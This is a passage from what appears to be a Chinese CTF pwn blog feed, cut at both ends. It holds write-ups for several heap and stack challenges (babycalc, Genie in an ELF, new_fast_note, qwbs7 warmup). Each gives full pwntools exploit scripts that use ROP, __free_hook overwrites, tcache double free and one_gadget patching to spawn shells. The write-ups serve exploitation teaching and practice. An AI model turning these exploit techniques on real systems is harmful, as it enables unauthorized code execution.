class="line">add(1,b&quot;a&quot;*0xa0+p64(0)+p64(0x471))#0</span><br><span class="line">add(1,&quot;a&quot;)#1</span><br><span class="line">add(1,&quot;b&quot;)#2</span><br><span class="line">add(1)#3</span><br><span class="line">add(1,b&quot;e&quot;*0xd0 + p64(0) + p64(0x21)) #4 堆块连续</span><br><span class="line">free(0)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">magic(2,-0xc0)</span><br><span class="line">add(1)#5</span><br><span class="line">add(1)#6</span><br><span class="line">free(6)</span><br><span class="line">show(6)</span><br><span class="line">r.recvuntil(&quot;cost: &quot;)</span><br><span class="line">libc.address = int(r.recvuntil(b&#x27;\n&#x27;)[:-1]) - 0x70 - libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&quot;\033[94mlibc_addr----&gt;\033[0m&quot;+hex(libc.address))</span><br><span class="line">system=libc.sym[&quot;system&quot;]</span><br><span class="line">free_hook=libc.sym[&quot;__free_hook&quot;]</span><br><span class="line">free(1)#构造堆重叠，控制tcachebins中chunk的fd/ bk</span><br><span class="line"></span><br><span class="line">add(2, b&#x27;\x00&#x27;*0x40 + p64(free_hook - 0x10)) #index 7，从unsortedbins中切割，同时修改tcacehbins中chunk的fd</span><br><span class="line">add(1,&quot;/bin/sh\x00&quot;)#8</span><br><span class="line">add(1,p64(libc.address+0x4f302))#9</span><br><span class="line">free(8)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>2022-西湖论剑-babycalc</title>
    <url>/2023/11/07/2022-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-babycalc/</url>
    <content><![CDATA[<p> 存在一个off_by_null可以覆写rbp最后一位，同时存在一个off_by_one可以覆写到&amp;v3+0xff，足够到ret了，但只可以覆写一位</p>
<p>程序本身ret就是leave_ret,还却一个，发现一个gadget</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400C17 90                            nop</span><br><span class="line">.text:0000000000400C18 C9                            leave</span><br><span class="line">.text:0000000000400C19 C3                            retn</span><br></pre></td></tr></table></figure>

<p>可以将ret的末位修改为0x18，实现栈迁移，同时又会对rbp末尾覆写为**”\x00”**</p>
<p>故，只要在栈上末位为00处布置rop链即可实现栈迁移。</p>
<p>考虑使用ret滑行到rop上，可以增加rop的概率</p>
<p>两次迁移，分别泄露libc和执行system(“&#x2F;bin&#x2F;sh\x00”)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">r=process(&#x27;./babycalc&#x27;)</span><br><span class="line">#r=remote(&quot;node4.anna.nssctf.cn&quot;,28980)</span><br><span class="line">elf = ELF(&#x27;./babycalc&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(r,&quot;b *0x400c18&quot;)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">rdi=0x0000000000400ca3</span><br><span class="line">rsi_r15=0x0000000000400ca1</span><br><span class="line">ret=0x00000000004005b9</span><br><span class="line">leave_ret=0x0000000000400bb7</span><br><span class="line">puts_plt=elf.plt[&quot;puts&quot;]</span><br><span class="line">puts_got=elf.got[&quot;puts&quot;]</span><br><span class="line"></span><br><span class="line">num=[19, 36, 53, 70, 55, 66, 17, 161, 50, 131, 212, 101, 118, 199, 24, 3]</span><br><span class="line">calc=b&quot;&quot;</span><br><span class="line">for i in range(16):</span><br><span class="line">    calc+=p8(num[i])</span><br><span class="line">r.recvuntil(b&quot;:&quot;)</span><br><span class="line">payload=b&quot;00000024&quot;+p64(ret)*21+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(0x400C1A)+calc+b&quot;\x00&quot;*0x18+p32(0)+p32(0x38)</span><br><span class="line">debug()</span><br><span class="line">r.send(payload)</span><br><span class="line">libc.address=u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-libc.sym[&quot;puts&quot;]</span><br><span class="line">log.success(&quot;libc.address: &quot;+hex(libc.address))</span><br><span class="line">system=libc.sym[&quot;system&quot;]</span><br><span class="line">binsh=next(libc.search(b&quot;/bin/sh\x00&quot;))</span><br><span class="line">payload=b&quot;00000024&quot;+p64(ret)*22+p64(rdi)+p64(binsh)+p64(system)+calc+b&quot;\x00&quot;*0x18+p32(0)+p32(0x38)</span><br><span class="line"></span><br><span class="line">#debug()</span><br><span class="line">r.sendafter(&quot;:&quot;,payload)</span><br><span class="line">r.interactive()</span><br><span class="line">log.success(&quot;system_address: &quot;+hex(system))</span><br><span class="line">log.success(&quot;binsh_address: &quot;+hex(binsh))</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>Glacierctf-2024</title>
    <url>/2024/12/19/Glacierctf-2024/</url>
    <content><![CDATA[<h1 id="Genie-in-an-ELF"><a href="#Genie-in-an-ELF" class="headerlink" title="Genie in an ELF"></a>Genie in an ELF</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>程序允许在任意地址(包括libc)，并给出了<code>/proc/self/maps</code></p>
<p>任意写是通过打开两个<code>/proc/self/mem</code>文件来实现的，所以我们甚至能写入只读地址</p>
<p>但是他是使用<code>fwrite</code>完成的，出于性能原因，glibc并不会立即写入文件，而是将他们缓冲，直到积累了足够的数据</p>
<p>要想真正写入文件，要么用<code>fflush</code>，要么使用<code>fclose</code>，但是程序既不刷新，也不关闭文件</p>
<p>但是在程序退出时，<code>exit</code>还是会帮我们处理这些”遗漏”的字节，来写入文件</p>
<p>会使用所谓的<a href="https://elixir.bootlin.com/glibc/glibc-2.39/C/ident/_IO_cleanup">_IO_cleanup</a> ，然后再到 <a href="https://elixir.bootlin.com/glibc/glibc-2.39/C/ident/_IO_flush_all">_IO_flush_all</a>,他会刷新全部文件，然后调用虚表之类的，但本题并没有那么深入</p>
<p>所以我们写入的字节只能是在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7f3103e967f8 &lt;_IO_cleanup+40&gt;    call   _IO_flush_all               &lt;_IO_flush_all&gt;</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7f3103e961d3 &lt;_IO_flush_all+227&gt;    call   qword ptr [rax + 0x18]      &lt;_IO_file_overflow&gt;</span><br></pre></td></tr></table></figure>

<p>之后，否则写入到前面的并不会执行，最后就完成exit，程序结束</p>
<h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><p>我在仅挨着<code>&lt;_IO_cleanup+40&gt;    call   _IO_flush_all</code>的栈中找到了 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">38:01c0│+150 0x7ffcbb781870 —▸ 0x56156ce53180 ◂— endbr64</span><br></pre></td></tr></table></figure>

<p>距离rsp仅仅为0x1c0,也就是说我们只需要找到一个add rsp，0x1xx     ret即可重新返回到start</p>
<p>add rsp的gadget并不少见，但我们很难找到一个jmp&#x2F;call来跳转到gadget</p>
<p>看官方wp是找到一个和gadget的小连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">87480:       41 83 7d 70 ff          cmp    DWORD PTR [r13+0x70],0xffffffff</span><br><span class="line">87485:       75 ba                   jne    87441 &lt;_IO_proc_open@@GLIBC_2.2.5+0x61&gt;</span><br></pre></td></tr></table></figure>

<p>这是跳转到了<code>_IO_new_proc_open</code>的中间<a href="https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/iopopen.c#L144">line 144</a>检测文件是否打开，很幸运，到这里的时候正好可以通过检测，于是可以到87441</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">87441:       31 c0                   xor    eax,eax</span><br><span class="line">87443:       48 8b 55 c8             mov    rdx,QWORD PTR [rbp-0x38]</span><br><span class="line">87447:       64 48 2b 14 25 28 00    sub    rdx,QWORD PTR fs:0x28</span><br><span class="line">8744e:       00 00 </span><br><span class="line">87450:       0f 85 37 04 00 00       jne    8788d &lt;_IO_proc_open@@GLIBC_2.2.5+0x4ad&gt;</span><br><span class="line">87456:       48 81 c4 08 01 00 00    add    rsp,0x108</span><br><span class="line">8745d:       5b                      pop    rbx</span><br><span class="line">8745e:       41 5c                   pop    r12</span><br><span class="line">87460:       41 5d                   pop    r13</span><br><span class="line">87462:       41 5e                   pop    r14</span><br><span class="line">87464:       41 5f                   pop    r15</span><br><span class="line">87466:       5d                      pop    rbp</span><br><span class="line">87467:       c3                      ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里也能通过检测，于是就到了add rsp ；ret</p>
<p>而低位为80的跳转也是能找到的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9696e:       0f 85 0c ff ff ff       jne    96880 &lt;_IO_flush_all_linebuffered@@GLIBC_2.2.5+0x440&gt;</span><br></pre></td></tr></table></figure>

<p>这样一来，只需更改0cff为0c0b即可跳转到87480</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7ff443a9696e &lt;_IO_cleanup+414&gt;    ✔ jne    _IO_proc_open+160           &lt;_IO_proc_open+160&gt;</span><br></pre></td></tr></table></figure>

<p>此时start距rsp仍是0x1c0，只需修改为add rsp，0x190即可</p>
<p>但是二次到达gadget时发现，原本0x1c0的start不见了，取而代之的是0x1e8的start+25</p>
<p>于是再次修改</p>
<p>再往后的每次都需要修改start+25为start，栈地址也是每次-0x10，但我们还剩下一字节任意写，足够我们来构造shellcode了</p>
<p>shellcode准备从0x11A5覆写，这一段可执行，也不会在写shellcode中运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwncli import *</span><br><span class="line">from pwn import *</span><br><span class="line">from math import *</span><br><span class="line"></span><br><span class="line">cli_script()  # 使用脚本模式必须显式调用这个函数</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line"># 你能够从gift里面取到很多东西</span><br><span class="line">io = gift[&quot;io&quot;]  # process或remote对象</span><br><span class="line">elf = gift[&quot;elf&quot;]  # ELF对象，ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = gift.libc  # ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">rop = gift.rop  # ROP对象</span><br><span class="line"></span><br><span class="line">filename = gift.filename  # current filename</span><br><span class="line">is_debug = gift.debug  # is debug or not</span><br><span class="line">is_remote = gift.remote  # is remote or not</span><br><span class="line">gdb_pid = gift.gdb_pid  # gdb pid if debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uu64 = lambda: u64(ru(&quot;\x7f&quot;).ljust(8, b&quot;\x00&quot;))</span><br><span class="line"># ra = lambda: r.recvall(timeout=1)</span><br><span class="line"></span><br><span class="line"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br><span class="line">if gift.remote:</span><br><span class="line">    libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">    gift[&quot;libc&quot;] = libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 搜索gadget</span><br><span class="line">ROPgadget_box = RopgadgetBox()</span><br><span class="line">CG.set_find_area(find_in_libc=True, find_in_elf=False)</span><br><span class="line">ru(&quot;begin:\n\n&quot;)</span><br><span class="line">pie = int(r(12), 16)</span><br><span class="line">ru(&quot;heap]\n&quot;)</span><br><span class="line">libc.address = int(r(12), 16)</span><br><span class="line">log_address_ex(&quot;pie&quot;)</span><br><span class="line">log_libc_base_addr(libc.address)</span><br><span class="line">IO_UNBUFFER_ALL_OFFSET = 0x96971</span><br><span class="line">IO_PROC_OPEN_ADD_RSP_OFFSET = 0x87459</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_byte(io: tube, addr: int, data: int):</span><br><span class="line">    assert data &gt;= 0 and data &lt;= 255</span><br><span class="line">    io.sendlineafter(b&quot;What address do you desire for your&quot;, hex(addr).encode())</span><br><span class="line">    io.sendlineafter(b&quot;And what byte do you wish here?\n&quot;, hex(data).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_byte(io, libc.address + IO_PROC_OPEN_ADD_RSP_OFFSET, 0x90)</span><br><span class="line">write_byte(io, libc.address + IO_UNBUFFER_ALL_OFFSET, 0x0B)</span><br><span class="line"># 改_IO_cleanup+414跳转到_IO_PROC_OPEN,也就是控制rsp并ret的地方</span><br><span class="line"># 成功后每次只需要改add rsp即可再回到start,还剩一字节任意写</span><br><span class="line">ru(&quot;My card deck stacks 0x&quot;)</span><br><span class="line">stack = int(r(12), 16)</span><br><span class="line">write_byte(io, stack + 360, 0x80)</span><br><span class="line">write_byte(io, libc.address + IO_PROC_OPEN_ADD_RSP_OFFSET, 0xB8)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = asm(</span><br><span class="line">    f&quot;&quot;&quot;</span><br><span class="line">        mov rdi,&#123;next(libc.search(b&quot;/bin/sh&quot;))&#125;</span><br><span class="line">        mov rax,&#123;libc.symbols[&quot;system&quot;]&#125;</span><br><span class="line">        call rax</span><br><span class="line">                &quot;&quot;&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">info(hexdump(code))</span><br><span class="line">shell_addr = pie + 0x11A5</span><br><span class="line">for i in range(len(code)):</span><br><span class="line">    info(f&quot; - &#123;i&#125; / &#123;len(code)&#125;&quot;)</span><br><span class="line">    stack -= 0x10</span><br><span class="line">    write_byte(io, shell_addr + i, code[i])</span><br><span class="line">    write_byte(io, stack + 360, 0x80)</span><br><span class="line"></span><br><span class="line">write_byte(io, 0, 0)</span><br><span class="line">write_byte(io, 0, 0)</span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p>还有一种很简单的方法</p>
<p>jmp&#x2F;call one_gadget</p>
<p>我们从libc中获取到4个one_gadget &#x3D; [0x583DC, 0x583E3, 0xEF4CE, 0xEF52B]</p>
<p>按程序流程一直走一遍，当jmp&#x2F;call的地址首位或后两位与gadget相同时即可</p>
<p>最终在0x472a1处发现   47a21:        e8 da 67 0a 00           call   0xee200                         </p>
<p>在gdb中来计算如何变成call 0xef52b</p>
<p>首先最低位计算</p>
<p>0x2b-00&#x3D;0x2b</p>
<p>pwndbg&gt; p&#x2F;x 0xda+0x2b<br>$1 &#x3D; 0x105</p>
<p>进位1，0x67变为0x68，00xda变为0x05</p>
<p>次低位计算</p>
<p>0xf5-0xe2&#x3D;0x13</p>
<p>pwndbg&gt; p&#x2F;x 0x68+0x13<br>$2 &#x3D; 0x7b</p>
<p>最终得到结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; !disasm -c amd64 -c little -a 0x47a21 e8 057b0a00                                       </span><br><span class="line">   47a21:        e8 05 7b 0a 00           call   0xef52b  </span><br></pre></td></tr></table></figure>

<p>即修改0x47a21+1&#x3D;05,0x47a21+2&#x3D;7b即可</p>
<p>这个比官方wp简单多了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwncli import *</span><br><span class="line">from pwn import *</span><br><span class="line">from math import *</span><br><span class="line"></span><br><span class="line">cli_script()  # 使用脚本模式必须显式调用这个函数</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line"># 你能够从gift里面取到很多东西</span><br><span class="line">io = gift[&quot;io&quot;]  # process或remote对象</span><br><span class="line">elf = gift[&quot;elf&quot;]  # ELF对象，ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = gift.libc  # ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">rop = gift.rop  # ROP对象</span><br><span class="line"></span><br><span class="line">filename = gift.filename  # current filename</span><br><span class="line">is_debug = gift.debug  # is debug or not</span><br><span class="line">is_remote = gift.remote  # is remote or not</span><br><span class="line">gdb_pid = gift.gdb_pid  # gdb pid if debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uu64 = lambda: u64(ru(&quot;\x7f&quot;).ljust(8, b&quot;\x00&quot;))</span><br><span class="line"># ra = lambda: r.recvall(timeout=1)</span><br><span class="line"></span><br><span class="line"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br><span class="line">if gift.remote:</span><br><span class="line">    libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">    gift[&quot;libc&quot;] = libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 搜索gadget</span><br><span class="line">ROPgadget_box = RopgadgetBox()</span><br><span class="line">CG.set_find_area(find_in_libc=True, find_in_elf=False)</span><br><span class="line">ru(&quot;begin:\n\n&quot;)</span><br><span class="line">pie = int(r(12), 16)</span><br><span class="line">ru(&quot;heap]\n&quot;)</span><br><span class="line">libc.address = int(r(12), 16)</span><br><span class="line">log_address_ex(&quot;pie&quot;)</span><br><span class="line">log_libc_base_addr(libc.address)</span><br><span class="line">IO_UNBUFFER_ALL_OFFSET = 0x96971</span><br><span class="line">IO_PROC_OPEN_ADD_RSP_OFFSET = 0x87459</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_byte(io: tube, addr: int, data: int):</span><br><span class="line">    assert data &gt;= 0 and data &lt;= 255</span><br><span class="line">    io.sendlineafter(b&quot;What address do you desire for your&quot;, hex(addr).encode())</span><br><span class="line">    io.sendlineafter(b&quot;And what byte do you wish here?\n&quot;, hex(data).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_byte(io, libc.address + 0x47A22, 0x05)</span><br><span class="line">write_byte(io, libc.address + 0x47A23, 0x7B)</span><br><span class="line">ia()</span><br><span class="line">one_gadget = [0x583DC, 0x583E3, 0xEF4CE, 0xEF52B]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2023-HGAME-WEEK2-new_fast_note</title>
    <url>/2023/11/05/2023-HGAME-WEEK2-new-fast-note/</url>
    <content><![CDATA[<p> 2.31版本，对tcache_dup加强了检查，会在tcache的bk处设置一个key，free时检查key。</p>
<p>在本题中，无edit，也就不能改变key</p>
<p>但是free和add次数足够</p>
<p>可以绕到fastbin中free，再在tcachebin中free一次，即可绕过key检查（但还要注意fastbin中的检查）</p>
<p>tcachebin中有个stash机制，tcachebin中无chunk时，从fastbin(或其他bins)中分配chunk时，会将该bins中的余下的chunk全都移到tcache中，这一点就会实现真正的地址任意写，而不必被fastbins中的size限制</p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;,os=&quot;linux&quot;)</span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">r=remote(&quot;node5.anna.nssctf.cn&quot;,28041)</span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">def getAddr():</span><br><span class="line">    return u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">    r.sendlineafter(&quot;&gt;&quot;,str(1))</span><br><span class="line">    r.sendlineafter(&quot;Index: &quot;,str(idx))</span><br><span class="line">    r.sendlineafter(&quot;Size: &quot;,str(size))</span><br><span class="line">    r.sendlineafter(&quot;Content: &quot;,content)</span><br><span class="line"></span><br><span class="line">def delelt(idx):</span><br><span class="line">    r.sendlineafter(&quot;&gt;&quot;, str(2))</span><br><span class="line">    r.sendlineafter(&quot;Index: &quot;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    r.sendlineafter(&quot;&gt;&quot;, str(3))</span><br><span class="line">    r.sendlineafter(&quot;Index: &quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">for i in range(9):</span><br><span class="line">    add(i,0x90,&quot;lian&quot;)</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    delelt(i)</span><br><span class="line"></span><br><span class="line">show(7)</span><br><span class="line">main_arena=getAddr()-96</span><br><span class="line">print(&quot;\033[95mmain_arena---&gt;\033[0m&quot;+hex(main_arena))</span><br><span class="line">libc.address=main_arena-0x1ecb80</span><br><span class="line">print(&quot;\033[93mlibc_addr---&gt;\033[0m&quot;+hex(libc.address))</span><br><span class="line">free_hook=libc.sym[&quot;__free_hook&quot;]</span><br><span class="line">print(&quot;\033[91mfree_hook---&gt;\033[0m&quot;+hex(free_hook))</span><br><span class="line"></span><br><span class="line">for i in range(9):</span><br><span class="line">    add(i,0x60,&quot;aaaa&quot;)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    delelt(i)</span><br><span class="line">delelt(7)</span><br><span class="line">delelt(8)</span><br><span class="line">delelt(7)</span><br><span class="line">one_gadgets=[0xe3afe,0xe3b01,0xe3b04]</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i,0x60,&quot;lian&quot;)</span><br><span class="line">add(7,0x60,p64(free_hook))</span><br><span class="line">add(8,0x60,&quot;a&quot;)</span><br><span class="line">add(9,0x60,&quot;a&quot;)</span><br><span class="line">add(10,0x60,p64(libc.sym[&quot;system&quot;]))</span><br><span class="line">add(11,0x20,&quot;/bin/sh\x00&quot;)</span><br><span class="line">delelt(11)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>dup</tag>
      </tags>
  </entry>
  <entry>
    <title>2023-qwbs7-warmup</title>
    <url>/2023/12/20/2023-qwbs7-warmup/</url>
    <content><![CDATA[<h1 id="exp分析"><a href="#exp分析" class="headerlink" title="exp分析"></a>exp分析</h1><p>利用off-by-null进行heap_overlopping 那一段可以看这篇文章，着重分析了2.29+的off-bu-one的利用方法</p>
<p><a href="https://tttang.com/archive/1614">https://tttang.com/archive/1614</a></p>
<p>尝试利用off-by-null利用unlinl，构造fake_chunk，利用unlink实现堆块重叠，两个idx指向同一个指针，之后进行double free，打house-of-apple</p>
<p>第一步：初始分配堆块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##init 首先初始分配堆块</span><br><span class="line">add(0x418) #0 A = P-&gt;fd										0x55ab94b952b0</span><br><span class="line">add(0x108 - 0x20) #1 barrier								0x55ab94b956d0</span><br><span class="line">add(0x438) #2 B0 helper										0x55ab94b957c0</span><br><span class="line">add(0x438) #3 C0 = p , p&amp;0xff = 0							0x55ab94b95c00</span><br><span class="line">add(0x108) #4 barrier										0x55ab94b96040</span><br><span class="line">add(0x488) # H0. helper for write bk-&gt;fd. vitcim chunk.		0x55ab94b96150</span><br><span class="line">add(0x428) # 6 D = P-&gt;bk									0x55ab94b965e0</span><br><span class="line">add(0x108) # 7 barrier										0x55ab94b96a10</span><br><span class="line">#其中1,4,7 用于防止堆块合并，此处顺便贴上本地调试时地址(使用heap命令查看的)</span><br><span class="line">#这里p的地址设置为00结尾，可以利用off-by-null修改fd/bk指向p</span><br></pre></td></tr></table></figure>

<p>第二步，设置unsortedbin</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># step 2 use unsortedbin to set p-&gt;fd =A , p-&gt;bk=D</span><br><span class="line">delete(0) # A</span><br><span class="line">delete(3) # C0</span><br><span class="line">delete(6) # D</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">unsortedbin中的链表情况为D-p-A   p-&gt;fd=A</span><br><span class="line">unsortedbin                                                                               all: 0x55ab94b965e0 —▸ 0x55ab94b95c00 —▸ 0x55ab94b952b0 —▸ 0x7f6ba0419ce0 ◂— 0x55ab94b965e0</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">delete(2) # 合并 B0 和 C0. 保存 p-&gt;fd p-&gt;bk</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">此时unsortedbin的情况为</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55ab94b957c0 —▸ 0x55ab94b965e0 —▸ 0x55ab94b952b0 —▸ 0x7f6ba0419ce0 ◂— 0x55ab94b957c0</span><br><span class="line">可以发现,原本的C0(p)已经和B0进行了合并，B0地址正是0x55ab94b957c0,而p仍在0x55ab94b95c00，且fd和bk并没有改变，我们将这里当作要伪造的fake_chunk(现在他不是真正的chunk了)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x /20gx 0x55ab94b95c00</span><br><span class="line">0x55ab94b95c00: 0x0000000000000000      0x0000000000000441</span><br><span class="line">0x55ab94b95c10: 0x000055ab94b952b0      0x000055ab94b965e0</span><br><span class="line">0x55ab94b95c20: 0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line">他的fd指向A,bk指向D</span><br><span class="line"></span><br><span class="line">A,D的fd，bk分别指向B0</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add(0x458, b&#x27;\x00&#x27;*0x438 + p64(0x551)[:-2])  # 把A,D放到largebins中, 再拆分B0. 用 B1 来设置 p-&gt;size=0x551  0									0x55ab94b957c0</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">分配出剩下一个C1，0x55ab94b95c20</span><br><span class="line">为什么设置size为0x551，后文再谈</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">add(0x418)  # C1 from ub   2						0x55ab94b95c20</span><br><span class="line">add(0x428)  # bk  D  from largebin   3				0x55ab94b965e0</span><br><span class="line">add(0x418)  # fd    A from largein    6				0x55ab94b952b0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># step3 使用unsortedbin 来设置 FD-&gt;bk</span><br><span class="line"># 部分覆写 FD -&gt; bk，这里就用到了之前所说的将p地址末位设置为00</span><br><span class="line">delete(6) # A=P-&gt;fd </span><br><span class="line">delete(2) # C1</span><br><span class="line"># unsortedbin: C1-A ,   A-&gt;BK = C1</span><br><span class="line">add(0x418, p64(0))  # 2 partial overwrite bk    A-&gt;bk = p		0x55ab94b952b0	A</span><br><span class="line">add(0x418) #    6				 								0x55ab94b95c20	C1</span><br><span class="line">#总结一下这一步，将C1(0x5c20)和A(FD)放入unsortedbins中(FD先放入)，FD的bk指向了0X5C20</span><br><span class="line">#利用分配时不会清空堆内容，以及off-by-null，修改FD-&gt;bk=p</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">pwndbg&gt; x /20gx 0x55ab94b952b0</span><br><span class="line">0x55ab94b952b0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x55ab94b952c0: 0x0000000000000000      0x000055ab94b95c00</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete(6) # A=p-&gt;fd &amp;&amp; A-&gt;bk=p 这里是为了让D-&gt;fd=0x5c20</span><br><span class="line">delete(3) # D</span><br><span class="line">delete(5) # D 和 H0 合并</span><br><span class="line">#利用堆块合并，修改D-&gt;fd=p</span><br><span class="line">add(0x4f8, b&#x27;\x00&#x27;*0x490) # 3</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">pwndbg&gt; x /20gx 0x55ab94b965e0</span><br><span class="line">0x55ab94b965e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55ab94b965f0: 0x000055ab94b95c00      0x00007f6ba0419ce0</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">add(0x3b0)  # 5     BK-&gt;fd=p</span><br><span class="line">add(0x418)  # 6</span><br></pre></td></tr></table></figure>

<p>已经设置好unlink的FD和BK了，接下来就是看看如何unlink了，我们需要让p进行unlink,实现堆块合并，对p+p-&gt;size的chunk进行free操作，同时，该chunk的prev_inuse&#x3D;0,chunk-&gt;prev_size&#x3D;p-&gt;size</p>
<p>prev_size好说，我们设置chunk的大小为0x??8即可控制prev_size,至于prev_inuse位也可以用off-by-null来控制</p>
<p>p+p-&gt;size为0x55ab94b96150，物理和他相连的是0x55ab94b96040，也就是idx为4的，于是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete(4)</span><br><span class="line">sla(b&#x27;&gt;&gt; &#x27;, b&#x27;1&#x27;)</span><br><span class="line">sla(b&#x27;Size: &#x27;, str(0x108))</span><br><span class="line">sa(b&#x27;Note: &#x27;, b&#x27;\x00&#x27;*0x100 + p64(0x550)) # 4</span><br></pre></td></tr></table></figure>

<p>从而实现了unlink的各个条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">prev_inuse=0</span><br><span class="line">prev_size=p-&gt;size</span><br><span class="line">FD-&gt;bk=p</span><br><span class="line">BK-&gt;fd=P</span><br></pre></td></tr></table></figure>

<p>进行unlink</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete(3)</span><br></pre></td></tr></table></figure>

<p>，就会发生</p>
